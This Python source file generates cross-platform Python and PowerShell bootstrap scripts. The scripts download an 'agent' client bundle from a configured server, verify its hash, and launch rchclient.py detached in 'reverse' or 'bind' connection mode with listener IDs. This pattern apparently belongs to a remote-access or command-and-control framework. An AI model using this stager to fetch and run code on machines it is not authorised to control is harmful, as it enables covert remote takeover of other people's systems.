
class AgentBootstrapScriptService:
    """
    Agent bootstrap 脚本生成服务。

    职责：
    - 校验并归一化 bootstrap 请求参数
    - 生成跨平台 Python bootstrap 脚本
    - 生成 Windows PowerShell bootstrap 脚本
    """

    def normalize_bootstrap_payload(self, payload: dict) -> dict:
        if not isinstance(payload, dict):
            raise ValueError('Invalid bootstrap payload')

        server_host = (payload.get('server_host') or '').strip()
        server_port = payload.get('server_port')
        web_port = payload.get('web_port')
        web_host = (payload.get('web_host') or server_host).strip() or server_host
        web_scheme = (payload.get('web_scheme') or 'http').strip() or 'http'
        listener_id = str(payload.get('listener_id') or '').strip()
        connection_mode = str(payload.get('connection_mode') or 'reverse').strip().lower()
        bind_host = str(payload.get('bind_host') or '0.0.0.0').strip()
        try:
            bind_port = int(payload.get('bind_port', 9443))
        except (TypeError, ValueError):
            raise ValueError('bind_port must be integer')
        if connection_mode not in ('reverse', 'bind'):
            raise ValueError('connection_mode must be reverse or bind')
        if connection_mode == 'bind' and (not bind_host or not 1 <= bind_port <= 65535):
            raise ValueError('Invalid Bind listen address or port')

        if connection_mode == 'bind':
            if not web_host:
                raise ValueError('web_host is required')
            server_host = web_host
            # Used only if the generated Client is manually switched to Reverse.
            server_port = 9999
        else:
            if not server_host:
                raise ValueError('server_host is required')
            if not server_port:
                raise ValueError('server_port is required')
        if not web_port:
            raise ValueError('web_port is required')

        try:
            server_port = int(server_port)
        except (ValueError, TypeError):
            raise ValueError('server_port must be integer')

        try:
            web_port = int(web_port)
        except (ValueError, TypeError):
            raise ValueError('web_port must be integer')

        if not 1 <= web_port <= 65534:
            raise ValueError('web_port must be between 1 and 65534')

        return {
            'server_host': server_host,
            'server_port': server_port,
            'web_host': web_host,
            'web_port': web_port,
            'web_scheme': web_scheme,
            'listener_id': listener_id,
            'connection_mode': connection_mode,
            'bind_host': bind_host,
            'bind_port': bind_port,
        }

    def generate_python_script(self, payload: dict) -> str:
        params = self.normalize_bootstrap_payload(payload)
        return self._generate_python_script(
            params['server_host'],
            params['server_port'],
            params['web_host'],
            params['web_port'],
            params['web_scheme'],
            params['listener_id'],
            params['connection_mode'], params['bind_host'], params['bind_port'],
        )

    def generate_powershell_script(self, payload: dict) -> str:
        params = self.normalize_bootstrap_payload(payload)
        return self._generate_powershell_script(
            params['server_host'],
            params['server_port'],
            params['web_port'],
            params['listener_id'],
            params['connection_mode'], params['bind_host'], params['bind_port'],
        )

    def _generate_python_script(self, server_host, server_port, web_host, web_port, web_scheme='http', listener_id='',
                                connection_mode='reverse', bind_host='0.0.0.0', bind_port=9443):
        import json
        script = _PYTHON_BOOTSTRAP
        for key, value in {
            '@SERVER_HOST@': json.dumps(server_host),
            '@SERVER_PORT@': str(server_port),
            '@WEB_HOST@': json.dumps(web_host),
            '@WEB_PORT@': str(web_port),
            '@WEB_SCHEME@': json.dumps(web_scheme),
            '@LISTENER_ID@': json.dumps(listener_id),
            '@CONNECTION_MODE@': json.dumps(connection_mode),
            '@BIND_HOST@': json.dumps(bind_host),
            '@BIND_PORT@': str(bind_port),
        }.items():
            script = script.replace(key, value)
        return script

    def _generate_powershell_script(self, server_host, server_port, web_port, listener_id='',
                                    connection_mode='reverse', bind_host='0.0.0.0', bind_port=9443):
        import json
        script = _POWERSHELL_BOOTSTRAP
        for key, value in {
            '@SERVER_HOST@': json.dumps(server_host),
            '@SERVER_PORT@': str(server_port),
            '@WEB_PORT@': str(web_port),
            '@LISTENER_ID@': json.dumps(listener_id),
            '@CONNECTION_MODE@': json.dumps(connection_mode),
            '@BIND_HOST@': json.dumps(bind_host),
            '@BIND_PORT@': str(bind_port),
        }.items():
            script = script.replace(key, value)
        return script


# Both bootstrap entrypoints follow the same release layout and SHA-256 contract.
# Their platform-specific interpreter selection is deliberate (Windows Embed, macOS local).
_PYTHON_BOOTSTRAP = r'''# bootstrap.py - Cross-platform bootstrap script
# Generated by server API
import hashlib
import json
import os
import runpy
import re
import shutil
import sys
import threading
import time
import urllib.request
import zipfile
from pathlib import Path
from urllib.parse import urljoin

SERVER_HOST = @SERVER_HOST@
SERVER_PORT = @SERVER_PORT@
WEB_HOST = @WEB_HOST@
WEB_PORT = @WEB_PORT@
WEB_SCHEME = @WEB_SCHEME@
LISTENER_ID = @LISTENER_ID@
CONNECTION_MODE = @CONNECTION_MODE@
BIND_HOST = @BIND_HOST@
BIND_PORT = @BIND_PORT@
BASE_URL = f"{WEB_SCHEME}://{WEB_HOST}:{WEB_PORT}"
MIN_PYTHON = (3, 10)


def is_ios_pythonista():
    if sys.platform == 'ios':
        return True
    try:
        import appex
        return True
    except ImportError:
        return False


# Pythonista cannot spawn child interpreters; keep its bundles in Documents.
IOS_PYTHONISTA = is_ios_pythonista()
ROOT = Path.home() / 'Documents' / 'client_bundle' if IOS_PYTHONISTA else Path.home() / 'client_bundle'
RUNTIME_DIR = ROOT / 'runtimes' / 'python-embed'
DOWNLOADS_DIR = ROOT / 'downloads'
RELEASES_DIR = ROOT / 'releases'


def log(message):
    print(f'[bootstrap] {message}', flush=True)


def request_bytes(url, payload=None):
    body = json.dumps(payload).encode() if payload is not None else None
    request = urllib.request.Request(url, data=body, headers={'Content-Type': 'application/json'} if body else {})
    log(f'HTTP request: {url}')
    with urllib.request.urlopen(request, timeout=300) as response:
        data = response.read()
    log(f'HTTP response received: {len(data)} bytes')
    return data


def runtime_version(python):
    import subprocess
    try:
        result = subprocess.run([str(python), '-c', 'import sys; print(sys.version_info.major,sys.version_info.minor)'],
                                capture_output=True, text=True, timeout=12, check=True)
        major, minor = map(int, result.stdout.strip().split())
        return major, minor
    except (OSError, ValueError, subprocess.SubprocessError):
        return (0, 0)


def find_embedded(root):
    return next((p for p in sorted(root.rglob('python.exe')) if p.is_file()), None) if root.is_dir() else None


def download(url, dest, sha256=None):
    dest.parent.mkdir(parents=True, exist_ok=True)
    tmp = dest.with_name(dest.name + '.part')
    log(f'Downloading: {url}')
    log(f'Saving to: {dest}')
    digest = hashlib.sha256()
    total = 0
    try:
        with urllib.request.urlopen(url, timeout=300) as response, open(tmp, 'wb') as output:
            while True:
                chunk = response.read(1024 * 1024)
                if not chunk:
                    break
                output.write(chunk)
                digest.update(chunk)
                total += len(chunk)
        log(f'Download complete: {total} bytes')
        if sha256 and digest.hexdigest().lower() != sha256.lower():
            raise ValueError('Downloaded file SHA-256 mismatch')
        if sha256:
            log('Download SHA-256 verified')
        os.replace(tmp, dest)
    finally:
        if tmp.exists():
            tmp.unlink()


def extract_zip(zip_path, destination):
    # Validate members before extraction and never extract symlinks.
    log(f'Extracting {zip_path} to {destination}')
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(zip_path) as archive:
        if archive.testzip() is not None:
            raise ValueError('ZIP CRC verification failed')
        for member in archive.infolist():
            name = member.filename.replace('\\', '/')
            path = Path(name)
            if path.is_absolute() or '..' in path.parts or (member.external_attr >> 16) & 0o170000 == 0o120000:
                raise ValueError(f'Unsafe ZIP member: {name}')
        archive.extractall(destination)
    log(f'Extracted successfully: {destination}')


def prepare_python():
    log(f'Preparing Python runtime (minimum {MIN_PYTHON[0]}.{MIN_PYTHON[1]}) on {sys.platform}')
    if IOS_PYTHONISTA:
        if sys.version_info[:2] < MIN_PYTHON:
            raise RuntimeError('Python 3.10 or newer is required')
        log(f'Using current iOS Python interpreter: {sys.executable}')
        return sys.executable
    if sys.platform != 'win32':
        for candidate in (sys.executable, shutil.which('python3'), shutil.which('python')):
            if candidate:
                version = runtime_version(candidate)
                log(f'Checking local Python: {candidate} ({version[0]}.{version[1]})')
                if version >= MIN_PYTHON:
                    log(f'Using local Python: {candidate}')
                    return str(candidate)
        raise RuntimeError('Python 3.10 or newer is required')

    embedded = find_embedded(RUNTIME_DIR)
    if embedded:
        version = runtime_version(embedded)
        log(f'Checking cached Python Embed: {embedded} ({version[0]}.{version[1]})')
        if version >= MIN_PYTHON:
            log(f'Using cached Python Embed: {embedded}')
            return str(embedded)
        log('Cached Python Embed is not compatible; checking local Python')
    else:
        log(f'No cached Python Embed found in: {RUNTIME_DIR}')
    for candidate in (sys.executable, shutil.which('python'), shutil.which('python3')):
        if candidate:
            version = runtime_version(candidate)
            log(f'Checking local Python: {candidate} ({version[0]}.{version[1]})')
            if version >= MIN_PYTHON:
                log(f'Using local Python: {candidate}')
                return str(candidate)

    # Python 3.13 Embed is packaged only for supported Windows amd64.
    import platform
    system_version = sys.getwindowsversion()
    if (system_version.major, system_version.minor) < (6, 3):
        raise RuntimeError('Python 3.13 Embed requires Windows 8.1 or newer')
    arch = platform.machine().lower()
    if arch in ('amd64', 'x86_64'):
        arch = 'amd64'
    if arch != 'amd64':
        raise RuntimeError(f'No embedded Python package available for Windows {arch}')
    url = f'{BASE_URL}/api/external-tools/python-embed/download?platform=win&arch={arch}'
    log(f'No compatible local Python; downloading Python Embed for win/{arch}')
    zip_path = DOWNLOADS_DIR / 'python-embed.zip'
    download(url, zip_path)
    staging = RUNTIME_DIR.with_name('python-embed.part')
    if staging.exists():
        shutil.rmtree(staging)
    try:
        extract_zip(zip_path, staging)
        found = find_embedded(staging)
        if not found or runtime_version(found) < MIN_PYTHON:
            raise RuntimeError('Downloaded Python runtime is missing or incompatible')
        relative = found.relative_to(staging)
        if RUNTIME_DIR.exists():
            shutil.rmtree(RUNTIME_DIR)
        staging.rename(RUNTIME_DIR)
        log(f'Python Embed ready: {RUNTIME_DIR / relative}')
        return str(RUNTIME_DIR / relative)
    finally:
        if staging.exists():
            shutil.rmtree(staging)


def build_bundle():
    payload = {
        'target_os': '', 'builder': 'python',
        'target_arch': '', 'source': 'bootstrap',
        'connection_mode': CONNECTION_MODE,
    }
    if CONNECTION_MODE == 'bind':
        payload.update(bind_host=BIND_HOST, bind_port=BIND_PORT)
    else:
        payload.update(
            server_web_scheme=WEB_SCHEME, server_web_host=WEB_HOST, web_port=WEB_PORT,
            server_host=SERVER_HOST, server_port=SERVER_PORT,
        )
        if LISTENER_ID:
            payload['listener_id'] = LISTENER_ID
    log(f'Requesting Bundle build: {BASE_URL}/api/agent/build')
    result = json.loads(request_bytes(f'{BASE_URL}/api/agent/build', payload))
    if result.get('code') != 0:
        raise RuntimeError(result.get('message') or 'Bundle build failed')
    data = result['data']
    log(f'Bundle build ready: {data.get("build_version", "unknown")} / {data.get("file_name", "unknown")}')
    return data


def launch(python, directory):
    script = directory / 'rchclient.py'
    if not script.is_file():
        raise FileNotFoundError(script)
    if IOS_PYTHONISTA:
        log('iOS/Pythonista detected, using runpy mode')
        def run():
            os.chdir(directory)
            sys.path.insert(0, str(directory))
            sys.argv = [str(script)]
            runpy.run_path(str(script), run_name='__main__')
        threading.Thread(target=run, name='rchclient-main', daemon=False).start()
        return
    import subprocess
    kwargs = {'cwd': str(directory), 'stdin': subprocess.DEVNULL,
              'stdout': subprocess.DEVNULL, 'stderr': subprocess.DEVNULL, 'close_fds': True}
    if sys.platform == 'win32':
        kwargs['creationflags'] = 0x00000008 | 0x00000200
    else:
        kwargs['start_new_session'] = True
    log(f'Launching detached Client: {python} {script} (cwd={directory})')
    subprocess.Popen([str(python), str(script)], **kwargs)
    log('Client process launched (detached)')


def main():
    log(f'Server Web: {BASE_URL}; Client Listen: {BIND_HOST}:{BIND_PORT}' if CONNECTION_MODE == 'bind'
        else f'Server: {BASE_URL}; Socket: {SERVER_HOST}:{SERVER_PORT}')
    log(f'Bundle root: {ROOT}')
    DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
    RELEASES_DIR.mkdir(parents=True, exist_ok=True)
    python = prepare_python()
    meta = build_bundle()
    version = meta['build_version']
    filename = meta['file_name']
    if not all(re.fullmatch(r'[A-Za-z0-9._-]+', value) and value not in ('.', '..')
               for value in (version, filename)):
        raise ValueError('Invalid build metadata path')
    expected_sha = meta.get('sha256')
    if not expected_sha:
        raise ValueError('Bundle build did not provide SHA-256')
    archive_path = DOWNLOADS_DIR / filename
    log(f'Downloading Bundle: {filename}')
    download(urljoin(BASE_URL + '/', meta['download_url']), archive_path, expected_sha)
    release = RELEASES_DIR / version
    log(f'Installing Bundle release: {release}')
    staging = RELEASES_DIR / (version + '.part')
    if staging.exists():
        shutil.rmtree(staging)
    try:
        extract_zip(archive_path, staging)
        if not (staging / 'rchclient.py').is_file():
            raise RuntimeError('Bundle missing rchclient.py')
        if release.exists():
            log(f'Replacing existing Bundle release: {release}')
            shutil.rmtree(release)
        staging.rename(release)
        log(f'Bundle installed successfully: {release}')
    finally:
        if staging.exists():
            shutil.rmtree(staging)
    launch(python, release)
    log('handoff done, bootstrap exits')


if __name__ == '__main__':
    main()
'''

_POWERSHELL_BOOTSTRAP = r'''$ErrorActionPreference = 'Stop'
$ip = @SERVER_HOST@
$serverPort=@SERVER_PORT@
$webPort=@WEB_PORT@
$listenerId=@LISTENER_ID@
$connectionMode=@CONNECTION_MODE@
$bindHost=@BIND_HOST@
$bindPort=@BIND_PORT@
$bundleDir = Join-Path $env:USERPROFILE 'client_bundle'
$runtimeDir = Join-Path $bundleDir 'runtimes\python-embed'
$downloadsDir = Join-Path $bundleDir 'downloads'
$releaseDir = Join-Path $bundleDir 'releases'
New-Item -Type Directory -Force $downloadsDir,$releaseDir | Out-Null
Write-Host "[bootstrap] Server Web: $ip`:$webPort; Mode: $connectionMode"
Write-Host "[bootstrap] Bundle root: $bundleDir"
Write-Host '[bootstrap] Preparing Python runtime (minimum 3.10)'

function Test-Python($binary) {
    try {
        $text = & $binary -c 'import sys; print(sys.version_info.major, sys.version_info.minor)' 2>$null
        if ($LASTEXITCODE -ne 0) { return $false }
        $parts = ("$text".Trim() -split '\s+')
        return ([int]$parts[0] -gt 3 -or ([int]$parts[0] -eq 3 -and [int]$parts[1] -ge 10))
    } catch { return $false }
}

function Find-Embed($folder) {
    if (-not (Test-Path $folder)) { return $null }
    return Get-ChildItem $folder -Filter python.exe -Recurse -File -ErrorAction SilentlyContinue |
        Select-Object -First 1 -ExpandProperty FullName
}

function Get-Hash256($path) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $stream = [System.IO.File]::OpenRead($path)
    try { return ([BitConverter]::ToString($sha.ComputeHash($stream))).Replace('-', '').ToLowerInvariant() }
    finally { $stream.Dispose(); $sha.Dispose() }
}

function Expand-ValidatedZip($archivePath, $destination) {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zip = [System.IO.Compression.ZipFile]::OpenRead($archivePath)
    try {
        $root = [IO.Path]::GetFullPath($destination).TrimEnd('\') + '\'
        foreach ($entry in $zip.Entries) {
            $target = [IO.Path]::GetFullPath((Join-Path $root $entry.FullName))
            if (-not $target.StartsWith($root, [StringComparison]::OrdinalIgnoreCase)) {
                throw "Unsafe ZIP member: $($entry.FullName)"
            }
        }
    } finally { $zip.Dispose() }
    New-Item -ItemType Directory -Force $destination | Out-Null
    [System.IO.Compression.ZipFile]::ExtractToDirectory($archivePath, $destination)
}

# Windows: embedded runtime first, then suitable local Python, then download Embed.
$py = Find-Embed $runtimeDir
if ($py) {
    Write-Host "[bootstrap] Checking cached Python Embed: $py"
    if (Test-Python $py) {
        Write-Host "[bootstrap] Using cached Python Embed: $py"
    } else {
        Write-Host '[bootstrap] Cached Python Embed is not compatible; checking local Python'
        $py = $null
    }
} else {
    Write-Host "[bootstrap] No cached Python Embed found in: $runtimeDir"
}
if (-not $py) {
    foreach ($candidate in @('python','python3')) {
        Write-Host "[bootstrap] Checking local Python: $candidate"
        if (Test-Python $candidate) {
            $py = $candidate
            Write-Host "[bootstrap] Using local Python: $candidate"
            break
        }
    }
}
if (-not $py) {
    if (Get-Command Get-CimInstance -ErrorAction SilentlyContinue) {
        $osInfo = Get-CimInstance Win32_OperatingSystem
    } else {
        $osInfo = Get-WmiObject Win32_OperatingSystem
    }
    $windowsVersion = [Version]$osInfo.Version
    if ($windowsVersion -lt [Version]'6.3') { throw 'Python 3.13 Embed requires Windows 8.1 or newer' }
    $arch = $env:PROCESSOR_ARCHITEW6432
    if (-not $arch) { $arch = $env:PROCESSOR_ARCHITECTURE }
    if ($arch -eq 'AMD64') { $arch = 'amd64' }
    if ($arch -ne 'amd64') { throw "No embedded Python package available for Windows $arch" }
    Write-Host "[bootstrap] No compatible local Python; downloading Python Embed for win/$arch"
    $zipPath = Join-Path $downloadsDir 'python-embed.zip'
    Write-Host "[bootstrap] Downloading: http://$ip`:$webPort/api/external-tools/python-embed/download?platform=win&arch=$arch"
    Invoke-WebRequest "http://$ip`:$webPort/api/external-tools/python-embed/download?platform=win&arch=$arch" -OutFile $zipPath -UseBasicParsing
    $staging = "$runtimeDir.part"
    if (Test-Path $staging) { Remove-Item $staging -Recurse -Force }
    Write-Host "[bootstrap] Python Embed downloaded: $zipPath"
    Write-Host "[bootstrap] Extracting Python Embed: $staging"
    Expand-ValidatedZip $zipPath $staging
    $candidate = Find-Embed $staging
    if (-not $candidate -or -not (Test-Python $candidate)) { throw 'Downloaded Embed is incompatible' }
    $relative = $candidate.Substring($staging.Length).TrimStart('\')
    if (Test-Path $runtimeDir) { Remove-Item $runtimeDir -Recurse -Force }
    Move-Item $staging $runtimeDir
    $py = Join-Path $runtimeDir $relative
    Write-Host "[bootstrap] Python Embed ready: $py"
}

$body = @{
    target_os=''; builder='python'; target_arch=''; source='bootstrap';
    connection_mode=$connectionMode
}
if ($connectionMode -eq 'bind') {
    $body['bind_host'] = $bindHost
    $body['bind_port'] = $bindPort
} else {
    $body['web_port'] = $webPort
    $body['server_web_scheme'] = 'http'
    $body['server_web_host'] = $ip
    $body['server_host'] = $ip
    $body['server_port'] = $serverPort
    if ($listenerId) { $body['listener_id'] = $listenerId }
}
$body = $body | ConvertTo-Json -Compress
Write-Host "[bootstrap] Requesting Bundle build: http://$ip`:$webPort/api/agent/build"
$response = Invoke-RestMethod "http://$ip`:$webPort/api/agent/build" -Method Post -ContentType 'application/json' -Body $body
if ($response.code -ne 0) { throw "Build failed: $($response.message)" }
$data = $response.data
Write-Host "[bootstrap] Bundle build ready: $($data.build_version) / $($data.file_name)"
if (-not $data.sha256) { throw 'Build response missing SHA-256' }
if ($data.file_name -notmatch '^[A-Za-z0-9._-]+$' -or
    $data.build_version -notmatch '^[A-Za-z0-9._-]+$' -or
    $data.file_name -in @('.', '..') -or $data.build_version -in @('.', '..')) {
    throw 'Invalid build metadata path'
}
$url = $data.download_url
if (-not $url.StartsWith('http')) { $url = "http://$ip`:$webPort$url" }
$zipPath = Join-Path $downloadsDir $data.file_name
Write-Host "[bootstrap] Downloading Bundle: $url"
Write-Host "[bootstrap] Saving to: $zipPath"
Invoke-WebRequest $url -OutFile $zipPath -UseBasicParsing
Write-Host "[bootstrap] Bundle downloaded: $zipPath"
if ((Get-Hash256 $zipPath) -ne $data.sha256.ToLowerInvariant()) { throw 'Bundle SHA-256 mismatch' }
Write-Host '[bootstrap] Bundle SHA-256 verified'
$release = Join-Path $releaseDir $data.build_version
$staging = "$release.part"
Write-Host "[bootstrap] Installing Bundle release: $release"
if (Test-Path $staging) { Remove-Item $staging -Recurse -Force }
try {
    Write-Host "[bootstrap] Extracting Bundle: $zipPath -> $staging"
    Expand-ValidatedZip $zipPath $staging
    if (-not (Test-Path (Join-Path $staging 'rchclient.py'))) { throw 'Bundle missing rchclient.py' }
    if (Test-Path $release) {
        Write-Host "[bootstrap] Replacing existing Bundle release: $release"
        Remove-Item $release -Recurse -Force
    }
    Move-Item $staging $release
    Write-Host "[bootstrap] Bundle installed successfully: $release"
} finally {
    if (Test-Path $staging) { Remove-Item $staging -Recurse -Force }
}
$script = Join-Path $release 'rchclient.py'
Write-Host "[bootstrap] Launching detached Client: $py $script"
# CreateNoWindow hides a console but does not guarantee process detachment.
# Use Python's Windows DETACHED_PROCESS flags, as Duplicate and Update do.
$launchCode = 'import os,subprocess,sys; script=os.path.abspath(sys.argv[1]); subprocess.Popen([sys.executable,script],cwd=os.path.dirname(script),stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,close_fds=True,creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)'
& $py -c $launchCode $script
if ($LASTEXITCODE -ne 0) { throw "Client launch failed (exit code $LASTEXITCODE)" }
Write-Host '[bootstrap] Client process launched (detached)'
Write-Host 'Bootstrap complete.'
'''
